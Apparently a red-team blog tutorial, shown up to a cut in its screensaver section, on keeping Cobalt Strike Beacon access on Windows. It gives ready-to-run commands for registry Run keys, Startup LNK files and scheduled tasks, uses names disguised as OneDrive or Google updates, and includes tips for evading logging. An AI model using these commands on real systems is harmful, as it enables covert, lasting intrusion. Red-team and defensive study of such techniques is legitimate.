---
title: Cobalt Strike Persistence: The Red Teamer's Guide to Maintaining Access
url: https://www.hackingdream.net/2026/02/cobalt-strike-persistence-red-teamers.html
source: Hacking Dream
date: 2026-02-14
fetch_date: 2026-02-15T04:25:33.445568
---

# Cobalt Strike Persistence: The Red Teamer's Guide to Maintaining Access

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### Cobalt Strike Persistence: The Red Teamer's Guide to Maintaining Access

[February 15, 2026](https://www.hackingdream.net/2026/02/cobalt-strike-persistence-red-teamers.html "permanent link")

Cobalt Strike Persistence: The Red Teamer's Guide to Maintaining Access

# Cobalt Strike Persistence: The Red Teamer's Guide to Maintaining Access

*Updated on February 15, 2026*

**Table of Contents**

* [Introduction](#intro)
* [Beacon Context & OpSec](#prereqs)
* [1. Registry Run Keys via Beacon](#tech1)
* [2. The Startup Folder (Upload & LNK)](#tech2)
* [3. Scheduled Tasks (The CS Way)](#tech3)
* [4. Screensaver Hijacking](#tech4)
* [5. PowerShell Profile Injection](#tech5)
* [6. COM Hijacking (Registry Manipulation)](#tech6)
* [7. Logon Scripts](#tech7)
* [8. File Association Hijacking](#tech8)
* [9. BITS Jobs via Shell](#tech9)
* [10. Office Template Poisoning](#tech10)
* [11. LNK Hijacking](#tech11)
* [Detection & Artifacts](#detection)
* [Conclusion](#conclusion)

## Introduction

In the world of adversarial simulation, landing a Beacon is only the first step. The real challenge often lies in keeping that access alive. When you are operating through Cobalt Strike, your methodology changes. You aren't just typing into a local CMD prompt; you are managing asynchronous agents, dealing with sleep cycles, and trying to minimize your on-disk footprint.

Persistence with Cobalt Strike requires a different mindset. You need to leverage Beacon's built-in capabilities like `shell`, `powershell`, and `execute-assembly`—to establish footholds that can survive a reboot.

This guide translates standard userland persistence techniques into actionable Cobalt Strike workflows. We will focus on maintaining access as a standard user, assuming you haven't yet escalated to SYSTEM.

[![Cobalt Strike Persistence: The Red Teamer's Guide to Maintaining Access](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGYJ7561SkaEiMNIVVmUEJ4iwcoX3ij0Gif5U3jqsugCm1IiyVTLpcu6fht-GiIrruoxu0CRsCNYmBanCKBb1p5xfmTkve3bl6FnCZlxlGV8GffdZR0TShQeZJp1QNCxEMdDQX1PQdHkYjziql8ugcXUEToGOotnqlYELN37-KqqJnE7zHFWF8uEHIm_nr/w640-h358/Cobalt-Strike-Persistence-The-Red-Teamers-Guide-to-Maintaining-Access.jpg "Cobalt Strike Persistence: The Red Teamer's Guide to Maintaining Access")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGYJ7561SkaEiMNIVVmUEJ4iwcoX3ij0Gif5U3jqsugCm1IiyVTLpcu6fht-GiIrruoxu0CRsCNYmBanCKBb1p5xfmTkve3bl6FnCZlxlGV8GffdZR0TShQeZJp1QNCxEMdDQX1PQdHkYjziql8ugcXUEToGOotnqlYELN37-KqqJnE7zHFWF8uEHIm_nr/s1024/Cobalt-Strike-Persistence-The-Red-Teamers-Guide-to-Maintaining-Access.jpg)

## Beacon Context & OpSec

Before executing any of these commands, check your context. Running persistence commands blindly is a quick way to burn an operation.

* **Check User Context:** Run `getuid` to confirm you are in a user process, not a high-integrity context (unless intended).
* **Sleep Cycle:** Remember that interactive commands (like `shell`) will hang until the Beacon checks in. Use `sleep 0` temporarily if you need instant feedback, but revert to `sleep 60` or higher immediately after.
* **OpSec Warning:** The `shell` command spawns `cmd.exe` as a child process. In highly monitored environments, prefer using Beacon Object Files (BOFs), `execute-assembly`, or built-in commands like `reg_set` where possible to avoid process creation events.

## 1. Registry Run Keys via Beacon

**MITRE ATT&CK: [T1547.001](https://attack.mitre.org/techniques/T1547/001/)**

The Registry Run key is the most straightforward method. While you *can* use `shell reg add`, it is noisy because it spawns `cmd.exe`. The superior method is to use Beacon's built-in `reg_set` command, which modifies the registry via internal APIs without creating a child process.

**Beacon Console**

```
# Check existing entries (Stealthy, no cmd.exe)
reg_query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Add a persistence entry (Stealthy)
# Syntax: reg_set [Key] [ValueName] [Data]
reg_set HKCU\Software\Microsoft\Windows\CurrentVersion\Run "OneDriveSync" "C:\Users\Public\beacon.exe"

# Legacy/Loud Method (Spawns cmd.exe - Avoid unless necessary)
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveSync" /t REG_SZ /d "C:\Users\Public\beacon.exe" /f
```

## 2. The Startup Folder (Upload & LNK)

**MITRE ATT&CK: [T1547.001](https://attack.mitre.org/techniques/T1547/001/)**

In Cobalt Strike, we don't just "copy" files; we `upload` them. For the Startup folder, dropping a raw EXE is noisy. Instead, upload your payload to a hidden directory and then create a shortcut (LNK) in the Startup folder using PowerShell one-liners.

**Beacon Console**

```
# 1. Move to the startup directory
cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

# 2. Upload a benign-looking LNK file (Pre-generated on your teamserver)
upload /path/to/local/Update.lnk

# ALTERNATIVE: Create LNK on the fly using PowerShell
powershell $s=(New-Object -COM WScript.Shell).CreateShortcut($env:APPDATA+'\Microsoft\Windows\Start Menu\Programs\Startup\EdgeUpdate.lnk');$s.TargetPath='C:\Users\Public\beacon.exe';$s.WindowStyle=7;$s.Save()
```

## 3. Scheduled Tasks (The CS Way)

**MITRE ATT&CK: [T1053.005](https://attack.mitre.org/techniques/T1053/005/)**

Creating tasks via `schtasks` is effective but creates a process tree. If you have the [SharPersist](INSERT_INTERNAL_URL)  tool compiled, you can use `execute-assembly` to create tasks entirely in memory, avoiding the `cmd.exe` spawn.

**Beacon Console (Standard)**

```
# Create a task running on logon
shell schtasks /create /tn "GoogleUpdateTaskUser" /tr "C:\Users\Public\beacon.exe" /sc onlogon /ru %USERNAME% /f

# Create a task running on idle
shell schtasks /create /tn "SystemIdleService" /tr "C:\Users\Public\beacon.exe" /sc onidle /i 10 /f
```

**Beacon Console (execute-assembly)**

```
# Using SharPersist (much stealthier)
execute-assembly /opt/Tools/SharPersist.exe -t schtask -c "C:\Users\Public\beacon.exe" -n "Updater" -m add -o onlogon
```

## 4. Screensaver Hijacking

**MITRE ATT&CK: [T1546.002](https://attack.mitre.org/techniques/T1546/002/)**

This technique relies on the user stepping away from their computer. We can manipulate the registry values directly from the Beacon console using `reg_set` to avoid command line logging.

**Beacon Console**

```
# Disable password protection for the screensaver
reg_set "HKCU\Control Panel\Deskto...